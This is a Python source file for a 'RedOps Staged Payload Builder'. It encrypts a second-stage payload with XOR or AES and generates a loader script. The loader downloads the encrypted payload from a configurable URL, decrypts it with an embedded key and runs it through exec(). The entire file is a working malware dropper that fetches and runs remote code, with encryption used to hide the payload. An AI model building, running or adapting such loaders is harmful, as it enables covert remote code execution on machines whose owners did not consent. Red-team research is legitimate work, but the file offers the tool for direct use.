import argparse
import base64
import os
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=b'AAAAAAAAAAAAAAAA')
    return cipher.encrypt(pad(data, AES.block_size))

def write_loader(payload_url, key, method):
    template = f"""
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_decrypt(data, key):
    from Crypto.Cipher import AES
    cipher = AES.new(key, AES.MODE_CBC, iv=b'AAAAAAAAAAAAAAAA')
    return unpad(cipher.decrypt(data), AES.block_size)

url = "{payload_url}"
key = base64.b64decode("{base64.b64encode(key).decode()}")
enc = requests.get(url).content

if "{method}" == "xor":
    dec = xor_decrypt(enc, key)
elif "{method}" == "aes":
    dec = aes_decrypt(enc, key)
else:
    raise Exception("Unknown method")

exec(dec.decode())
"""
    return template.strip()

def main():
    parser = argparse.ArgumentParser(description="RedOps Staged Payload Builder")
    parser.add_argument('--payload', required=True, help='Path to stage2 payload')
    parser.add_argument('--output', required=True, help='Path to save loader script')
    parser.add_argument('--xor', help='XOR key (string)')
    parser.add_argument('--aes', help='AES key (must be 16, 24, or 32 bytes)')

    parser.add_argument('--url', default='http://127.0.0.1:5000/stage2/default', help='URL to fetch stage2 from')

    args = parser.parse_args()

    with open(args.payload, 'rb') as f:
        raw = f.read()

    if args.xor:
        key = args.xor.encode()
        encrypted = xor_encrypt(raw, key)
        method = "xor"
    elif args.aes:
        key = args.aes.encode()
        if len(key) not in [16, 24, 32]:
            raise ValueError("AES key must be 16, 24, or 32 bytes")
        encrypted = aes_encrypt(raw, key)
        method = "aes"
    else:
        raise Exception("Provide either --xor or --aes")

    with open("stage2.enc", "wb") as f:
        f.write(encrypted)

    loader = write_loader(args.url, key, method)
    with open(args.output, "w") as f:
        f.write(loader)

    print(f"[+] Encrypted payload saved as stage2.enc")
    print(f"[+] Loader saved to {args.output}")

if __name__ == "__main__":
    main()